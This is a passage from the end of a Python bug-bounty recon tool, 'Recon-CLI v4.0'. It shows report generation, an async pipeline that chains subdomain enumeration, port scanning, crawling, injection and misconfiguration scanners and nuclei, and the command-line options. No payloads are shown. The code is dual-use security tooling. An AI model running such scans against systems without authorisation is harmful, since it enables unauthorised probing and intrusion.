  ⚠️ <strong style="color:#ffcc00">{probable_count}</strong> Probable &nbsp;
  💡 <strong style="color:#666">{len(findings)-confirmed_count-probable_count}</strong> Potential
</p>
<h2>Scan Overview</h2>
<p>Subdomains: {len(STATE['subdomains'])} | Live hosts: {len(STATE['live_hosts'])} | Param URLs: {len(STATE['param_urls'])} | Total findings: {len(findings)}</p>
<h2>Vulnerability Findings</h2>
<table>
  <thead><tr><th>Severity</th><th>Confidence</th><th>Type</th><th>URL</th><th>Detail</th><th>Evidence</th><th>Time</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
<h2>Live Hosts</h2>
<table>
  <thead><tr><th>URL</th><th>Status</th><th>Title</th><th>Server</th></tr></thead>
  <tbody>{live_rows}</tbody>
</table>
{'<h2>Open Ports</h2><table><thead><tr><th>Host</th><th>Port</th><th>Service</th></tr></thead><tbody>' + port_rows + '</tbody></table>' if port_rows else ''}
</main>
<footer>Generated by Recon-CLI v4.0 — Async High Performance Edition — Authorized testing only.</footer>
</body></html>"""

    path = out_dir / "report.html"
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  {OK} HTML → {path}")

def save_markdown_report(out_dir):
    findings  = sorted(STATE["findings"],
        key=lambda x: (SEVERITY_ORDER.get(x["severity"], 9),
                       {"confirmed": 0, "probable": 1}.get(x.get("confidence",""), 2)))
    confirmed = [f for f in findings if f.get("confidence") == "confirmed"]
    probable  = [f for f in findings if f.get("confidence") == "probable"]

    lines = [
        f"# Bug Bounty Report — {STATE['domain']}",
        f"",
        f"**Started**: {STATE['started_at']}  |  **Finished**: {STATE['finished_at']}",
        f"",
        f"> ⚡ v4.0 Async Zero False Positive Mode",
        f"",
        f"## Summary",
        f"| Metric | Value |",
        f"|--------|-------|",
        f"| Subdomains | {len(STATE['subdomains'])} |",
        f"| Live Hosts | {len(STATE['live_hosts'])} |",
        f"| Param URLs | {len(STATE['param_urls'])} |",
        f"| Total Findings | {len(findings)} |",
        f"| ✅ Confirmed | {len(confirmed)} |",
        f"| ⚠️ Probable | {len(probable)} |",
        f"",
        f"## Confirmed Findings",
        f"| # | Severity | Type | URL | Detail |",
        f"|---|----------|------|-----|--------|",
    ]
    for i, f in enumerate(confirmed, 1):
        lines.append(f"| {i} | **{f['severity'].upper()}** | {f['type']} | `{f['url']}` | {f.get('detail','')} |")
    lines += ["", "## Probable Findings",
              "| # | Severity | Type | URL | Detail |",
              "|---|----------|------|-----|--------|"]
    for i, f in enumerate(probable, 1):
        lines.append(f"| {i} | {f['severity'].upper()} | {f['type']} | `{f['url']}` | {f.get('detail','')} |")
    lines += ["", "---",
              "*Generated by Recon-CLI v4.0 — Async High Performance Edition.*",
              "*Zero False Positive — HackerOne Ready.*"]

    path = out_dir / "report.md"
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"  {OK} Markdown → {path}")

def generate_reports(domain):
    print(f"\n{INFO} {C.BOLD}[REPORT] Generating reports{C.RESET}")
    STATE["finished_at"] = datetime.now().isoformat()
    out_dir = Path(f"recon_{domain.replace('.', '_')}")
    out_dir.mkdir(exist_ok=True)
    save_json_report(out_dir)
    save_html_report(out_dir)
    save_markdown_report(out_dir)
    (out_dir / "subdomains.txt").write_text("\n".join(STATE["subdomains"]))
    (out_dir / "live_hosts.txt").write_text("\n".join(h["url"] for h in STATE["live_hosts"]))
    (out_dir / "param_urls.txt").write_text("\n".join(STATE["param_urls"]))
    print(f"\n  {OK} {C.GREEN}{C.BOLD}Reports saved → ./{out_dir}/{C.RESET}")
    return out_dir


# ──────────────────────────────────────────────
#  9. MAIN — async entry point
# ──────────────────────────────────────────────
async def async_main(args):
    print_banner()
    STATE["domain"]     = args.domain
    STATE["started_at"] = datetime.now().isoformat()

    print(f"{INFO} Target  : {C.CYAN}{C.BOLD}{args.domain}{C.RESET}")
    print(f"{INFO} Delay   : {args.delay}s   Threads: {args.threads}")
    print(f"{INFO} Mode    : {C.GREEN}Zero FP · Async · HackerOne Ready{C.RESET}")
    print()

    # ── RECON ─────────────────────────────────
    if args.recon:
        subdomains = await run_subfinder_async(args.domain)
    else:
        subdomains = [args.domain]
        STATE["subdomains"] = subdomains

    live_hosts = await probe_live_hosts_async(subdomains, concurrency=args.threads * 2)
    if not live_hosts:
        print(f"\n{ERR} No live hosts found. Exiting.")
        return

    # ── PORTS ─────────────────────────────────
    if args.ports:
        await port_scanner_async(subdomains, concurrency=args.threads * 5)

    # ── URL COLLECTION ─────────────────────────
    param_urls = []
    need_urls  = args.crawl or any([args.xss, args.ssti, args.sqli, args.lfi, args.ssrf, args.redirect])

    if need_urls:
        print(f"\n{INFO} {C.BOLD}[CRAWL] URL Collection{C.RESET}")
        all_urls = []

        wayback = await collect_wayback_urls_async(args.domain)
        all_urls += wayback

        if len(wayback) < 50:
            print(f"  {WARN} Wayback returned {len(wayback)} URLs — running async crawler…")
            crawled = await crawl_live_hosts_async(live_hosts,
                max_depth=args.crawl_depth, max_urls_per_host=200, delay=args.delay)
            all_urls += crawled

        all_urls += [h["url"] for h in live_hosts]
        param_urls = build_param_urls(all_urls)

        if len(param_urls) > args.max_urls:
            print(f"  {WARN} Capping to {args.max_urls} URLs (--max-urls to change)")
            param_urls = param_urls[:args.max_urls]

    # ── VULN SCANNERS — Run concurrently where safe ─────────────
    if any([args.xss, args.ssti, args.sqli, args.lfi, args.ssrf, args.redirect,
            args.headers, args.cors, args.exposed, args.takeover]):
        print(f"\n{INFO} {C.BOLD}[VULN] Vulnerability Scanning — Async Zero FP Mode{C.RESET}")

    # Network-intensive scanners that can run in parallel
    parallel_tasks = []
    t = args.threads
    if args.xss     and param_urls: parallel_tasks.append(scan_xss_async(param_urls, delay=args.delay, concurrency=t))
    if args.ssti    and param_urls: parallel_tasks.append(scan_ssti_async(param_urls, delay=args.delay, concurrency=t))
    if args.ssrf    and param_urls: parallel_tasks.append(scan_ssrf_async(param_urls, delay=args.delay, concurrency=t))
    if args.redirect and param_urls: parallel_tasks.append(scan_open_redirect_async(param_urls, delay=args.delay, concurrency=t))
    if args.exposed:                parallel_tasks.append(scan_exposed_files_async(live_hosts, delay=args.delay, concurrency=t * 2))
    if args.cors:                   parallel_tasks.append(scan_cors_async(live_hosts, delay=args.delay, concurrency=t))
    if args.takeover:               parallel_tasks.append(scan_subdomain_takeover_async(live_hosts))

    if parallel_tasks:
        await asyncio.gather(*parallel_tasks)

    # Sequential for time-sensitive timing-based checks
    if args.sqli and param_urls:
        await scan_sqli_async(param_urls, delay=args.delay, concurrency=t)
    if args.lfi and param_urls:
        await scan_lfi_async(param_urls, delay=args.delay, concurrency=t)

    if args.headers:
        scan_security_headers(live_hosts)

    # ── NUCLEI ────────────────────────────────
    if args.nuclei:
        nout = f"recon_{args.domain.replace('.','_')}/nuclei_results.txt"
        Path(nout).parent.mkdir(exist_ok=True)
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(
            None, lambda: run_nuclei(live_hosts, severity=args.nuclei_severity, output_file=nout)
        )

    # ── REPORT ────────────────────────────────
    if args.report or args.all:
        generate_reports(args.domain)
    else:
        STATE["finished_at"] = datetime.now().isoformat()

    # ── SUMMARY ───────────────────────────────
    confirmed = [f for f in STATE["findings"] if f.get("confidence") == "confirmed"]
    probable  = [f for f in STATE["findings"] if f.get("confidence") == "probable"]

    print(f"\n{'═'*60}")
    print(f"  {C.BOLD}{C.GREEN}SCAN COMPLETE — v4.0 Async Edition{C.RESET}")
    print(f"{'═'*60}")
    print(f"  Domain        : {args.domain}")
    print(f"  Subdomains    : {len(STATE['subdomains'])}")
    print(f"  Live Hosts    : {len(STATE['live_hosts'])}")
    print(f"  Param URLs    : {len(STATE['param_urls'])}")
    print(f"  Total findings: {len(STATE['findings'])}")
    print(f"  ✅ Confirmed  : {C.GREEN}{len(confirmed)}{C.RESET}")
    print(f"  ⚠️  Probable   : {C.YELLOW}{len(probable)}{C.RESET}")
    print(f"  ℹ️  Potential  : {C.DIM}{len(STATE['findings'])-len(confirmed)-len(probable)}{C.RESET}")

    if confirmed:
        counts = {}
        for f in confirmed:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1
        print(f"\n  Severity of Confirmed:")
        for sev in ["critical", "high", "medium", "low", "info"]:
            if sev in counts:
                color = C.RED+C.BOLD if sev in ("critical","high") else C.YELLOW if sev=="medium" else C.CYAN
                print(f"    {color}{sev.upper():>10}{C.RESET} : {counts[sev]}")

    print(f"\n  {C.DIM}Authorized bug bounty / security testing only.{C.RESET}\n")

    # Cleanup global clients
    global _sync_client, _async_client
    if _sync_client and not _sync_client.is_closed:
        _sync_client.close()
    if _async_client and not _async_client.is_closed:
        await _async_client.aclose()


def main():
    parser = argparse.ArgumentParser(
        description="Recon-CLI v4.0 — Bug Bounty Pipeline (Async High Performance Edition)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument('-d', '--domain',        required=True)
    parser.add_argument('--all',                 action='store_true')
    parser.add_argument('--recon',               action='store_true')
    parser.add_argument('--ports',               action='store_true')
    parser.add_argument('--crawl',               action='store_true')
    parser.add_argument('--vuln',                action='store_true')
    parser.add_argument('--xss',                 action='store_true')
    parser.add_argument('--ssti',                action='store_true')
    parser.add_argument('--sqli',                action='store_true')
    parser.add_argument('--lfi',                 action='store_true')
    parser.add_argument('--ssrf',                action='store_true')
    parser.add_argument('--redirect',            action='store_true')
    parser.add_argument('--headers',             action='store_true')
    parser.add_argument('--cors',                action='store_true')
    parser.add_argument('--exposed',             action='store_true')
    parser.add_argument('--takeover',            action='store_true')
    parser.add_argument('--nuclei',              action='store_true')
    parser.add_argument('--nuclei-severity',     default='medium,high,critical')
    parser.add_argument('--report',              action='store_true')
    parser.add_argument('--delay',   type=float, default=0.3,
                        help='Delay between requests per goroutine (default: 0.3)')
    parser.add_argument('-c', '--concurrency', type=int, dest='threads', default=30,
                        help='Concurrency base limit (default: 30)')
    parser.add_argument('--max-urls', type=int,  default=1000)
    parser.add_argument('--crawl-depth', type=int, default=2)

    args = parser.parse_args()

    if args.all:
        args.recon = args.ports = args.crawl = args.vuln = True
        args.nuclei = args.report = True
    if args.vuln:
        args.xss = args.ssti = args.sqli = args.lfi = args.ssrf = True
        args.redirect = args.headers = args.cors = True
        args.exposed = args.takeover = True

    asyncio.run(async_main(args))


if __name__ == "__main__":
    main()